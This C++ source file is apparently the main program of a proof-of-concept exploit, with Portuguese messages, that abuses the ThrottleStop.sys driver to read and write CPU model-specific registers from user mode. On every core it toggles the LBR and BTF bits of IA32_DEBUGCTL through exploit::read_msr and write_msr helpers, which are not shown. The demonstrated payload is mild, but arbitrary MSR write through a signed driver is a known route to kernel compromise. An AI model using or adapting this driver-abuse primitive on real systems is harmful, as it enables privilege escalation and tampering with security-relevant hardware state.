#include "includes.h"

#define IA32_DEBUGCTL 0x1D9

void pause( )
{
	printf( "\nPressione Enter para continuar" );
	system( "pause>nul" );
	printf( "\n" );
}

void toggle_lbr_btf_flags_on_core( uint32_t core_id )
{
	printf( "\t[ + ] Setando Affinity Mask para o Core %d\n\n", core_id );

	if ( !SetProcessAffinityMask( GetCurrentProcess( ), static_cast<uint64_t>( 1 ) << ( core_id - 1 ) ) )
		return;

	DebugCtl debug_ctl;
	if ( exploit::read_msr( IA32_DEBUGCTL, &debug_ctl.value ) )
		printf( "\t[ + ] LBR: %d | BTF: %d\n\t[ + ] Alternando Valores\n\n", debug_ctl.lbr, debug_ctl.btf );
	else
	{
		printf( "\t[ ! ] Erro a ler o MSR\n" );
		return;
	}

	debug_ctl.lbr = !debug_ctl.lbr;
	debug_ctl.btf = !debug_ctl.btf;

	if ( !exploit::write_msr( IA32_DEBUGCTL, debug_ctl.value ) )
	{
		printf( "\t[ ! ] Erro a escrever no MSR\n" );
		return;
	}

	if ( exploit::read_msr( IA32_DEBUGCTL, &debug_ctl.value ) )
		printf( "\t[ + ] LBR: %d | BTF: %d\n\t[ + ] Alternando Valores\n\n", debug_ctl.lbr, debug_ctl.btf );
	else
		printf( "\t[ ! ] Erro a ler o MSR\n" );

	debug_ctl.lbr = !debug_ctl.lbr;
	debug_ctl.btf = !debug_ctl.btf;

	if ( !exploit::write_msr( IA32_DEBUGCTL, debug_ctl.value ) )
	{
		printf( "\t[ ! ] Erro a escrever no MSR\n" );
		return;
	}

	if ( exploit::read_msr( IA32_DEBUGCTL, &debug_ctl.value ) )
		printf( "\t[ + ] LBR: %d | BTF: %d\n", debug_ctl.lbr, debug_ctl.btf );
	else
		printf( "\t[ ! ] Erro a ler o MSR\n" );
}

int main( )
{
	system( "title ThrottleStop PoC by M47Z" );

	printf( "\n\tThrottleStop R/W MSR Exploit PoC by M47Z\n\nE necessario o driver (ThrottleStop.sys) estar a correr no computador antes do programa ser executado\n" );

	pause( );

	printf( "[ + ] Abrindo Handle\n" );

	if ( !exploit::open_handle( ) )
	{
		printf( "[ ! ] Erro a Abrir Handle..." );
		pause( );
		return 1;
	}

	SYSTEM_INFO sys_info { };
	GetSystemInfo( &sys_info );

	printf( "[ + ] CPU com %d logical cores\n[ + ] Iterando core por core para alternar os bits LBR e BTF presentes no MSR IA32_DEBUGCTL\n\n", sys_info.dwNumberOfProcessors );

	for ( uint32_t i = 1; i <= sys_info.dwNumberOfProcessors; i++ )
	{
		printf( "\nCore %d\n", i );

		toggle_lbr_btf_flags_on_core( i );
	}

	printf( "\n[ + ] Fechando Handle\n" );

	exploit::close_handle( );

	pause( );

	return 0;
}